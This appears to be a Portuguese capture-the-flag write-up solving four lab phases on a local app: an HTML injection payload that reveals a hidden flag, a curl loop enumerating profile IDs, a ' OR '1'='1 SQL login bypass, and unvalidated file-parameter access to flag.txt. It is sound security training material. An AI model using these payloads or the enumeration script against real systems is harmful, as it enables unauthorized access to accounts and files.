### Fase 1 — HTML Injection

**Comportamento observado ao enviar o conteúdo:**

```html
<p>Seu feedback: <input type="text" value="*texto que o usuário informa*"></p>
```

**Payload testado no campo:**

```html
"><textarea>
```

**Retorno recebido:**

```html
 <p>Seu feedback: <input type="text" value=""><textarea>"<!-- DICA SECRETA: flag{comentario_oculto} -->></p>
```

---

### Fase 2 — Access Control

Criei um script simples que varre IDs e detecta perfis válidos pela presença da string `Informações do Usuário` na resposta da requisição:

```bash
for id in {1..10000}; do
    response=$(curl -s "http://localhost:5000/perfil?id=$id")

    if echo "$response" | grep -q "Informações do Usuário"; then        
        echo "ID $id: http://localhost:5000/perfil?id=$id"
    fi
done
```

**Exemplo de saída:**

```bash
ID 1: http://localhost:5000/perfil?id=1
ID 1337: http://localhost:5000/perfil?id=1337
```

---

### Fase 3 — SQL Injection

A aplicação executa uma query SQL ao submeter `username` e `password`:

```sql
SELECT * FROM usuarios WHERE username = '' AND password = ''
```

**Exploração (exemplo):**

Injetando:

```sql
' OR '1'='1
```

A consulta resultante torna-se equivalente a:

```sql
SELECT * FROM usuarios WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

Isso retorna uma condição verdadeira, permitindo a autenticação.

---

### Fase 4 — IDOR (Insecure Direct Object Reference)

Acessei por um arquivo específico no servidor local, nesse caso `flag.txt`:

```url
http://localhost:5000/documento?file=flag.txt
```

Como a aplicação não valida o parâmetro `file`, isso permite o acesso a arquivos sensíveis.
